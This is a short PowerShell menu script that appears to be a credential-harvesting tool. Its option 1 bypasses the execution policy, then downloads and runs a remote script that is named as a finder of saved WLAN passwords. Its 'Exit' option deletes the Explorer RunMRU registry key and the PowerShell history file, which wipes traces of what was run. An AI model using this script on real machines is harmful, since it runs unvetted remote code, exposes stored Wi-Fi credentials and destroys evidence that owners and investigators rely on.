# Menu function to display options and get user input
function Show-Menu {
    Clear-Host
    Write-Host " -------------------------------------------------- "
    Write-Host "|                    SCRIPT MENU                   |"
    Write-Host " -------------------------------------------------- "
    Write-Host "0. Exit"
    Write-Host "1. Find saved WLAN passwords"

    Write-Host
    $choice = Read-Host "Enter your choice"

    # Process user input
    switch ($choice) {
        "0" { Run-Script0 }
        "1" { Run-Script1; Press-AnyKey; Show-Menu }  # Added Press-AnyKey and Show-Menu here
        default {
            Write-Host "Invalid choice. Please try again."
            Show-Menu
        }
    }
}

# Define individual script functions
function Run-Script0 {
    Write-Host "Clearing execution history..."
    Set-Location HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
    Remove-Item .\RunMRU\

    Write-Host "Clearing PowerShell history..."
    Remove-Item (Get-PSReadlineOption).HistorySavePath

    Write-Host "Goodbye"
    exit
}

function Run-Script1 {
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/WLAN-PSW-Finder.ps1').Content);pause"
}

# Helper function to prompt user to press any key
function Press-AnyKey {
    Write-Host
    Write-Host "Press Enter to continue..."
    $key = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp")
    if ($key.KeyChar -eq "`r") {
        Press-AnyKey
    }
}

# Start the script by showing the menu
Show-Menu